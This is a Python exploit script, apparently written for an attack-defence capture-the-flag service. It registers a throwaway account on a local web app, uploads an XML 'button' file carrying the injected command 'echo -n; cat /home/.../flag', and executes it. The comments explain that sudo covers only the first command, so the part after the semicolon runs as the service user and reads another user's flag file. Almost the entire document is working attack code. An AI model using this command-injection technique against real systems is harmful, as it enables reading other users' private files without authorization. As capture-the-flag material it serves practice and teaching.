
import secrets
import requests
import string

# the exploit must know where to find the service (ip, port) as well as the
# username of the flag holder and the name of the flag file
IP = "127.0.0.1"
PORT = 5000
USERNAME = "o345f5c89"
FILE = "efbca9c71fae.button"

# first, we generate random user data to create a (probably) untaken account!
username = f"{secrets.choice(string.ascii_lowercase)}{secrets.token_hex(2+secrets.randbelow(5))}"
password = secrets.token_hex()

credentials = {
    'username': username,
    'password': password
}

# Then we use the credentials to generate an account
url = f"http://{IP}:{PORT}/register"
res = requests.post(url, data = credentials)

# then we create a session to operate from within our account
s = requests.Session()
res = s.post(f"http://{IP}:{PORT}/login", data = credentials)
res = s.get(f"http://{IP}:{PORT}/login", allow_redirects=False)
if res.status_code != 302:
    print("The service is down!")
    exit()

# here we create our script.
script = f"echo -n; cat /home/{USERNAME}/{FILE}"

# the application adds sudo in front of the script. which results in "sudo -u ouruser echo -n; cat /home/flagholder/flag.button"
# sudo only applies to the first command. We use "echo -n" to generate no noice and get the flag in return as is. The command
# behind the semicolon gets executed as the service user. Since the service user needs read access to the home folders to find
# and load the button files, we can easily read the flagholders home including the flag.

# let's convert the script into a button file and upload it
content = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<command>\n<name>Generate Password</name>\n<script>{script}</script>\n</command>"
res = s.post(f"http://{IP}:{PORT}/add", data = {'filename':'exploit.button'})
res = s.post(f"http://{IP}:{PORT}/edit?button=/home/{username}/exploit.button", data = {'content':content})

# if we now execute the button, we get the flag
res = s.get(f"http://{IP}:{PORT}/execute?button=/home/{username}/exploit.button")
flag = res.text

print(flag)
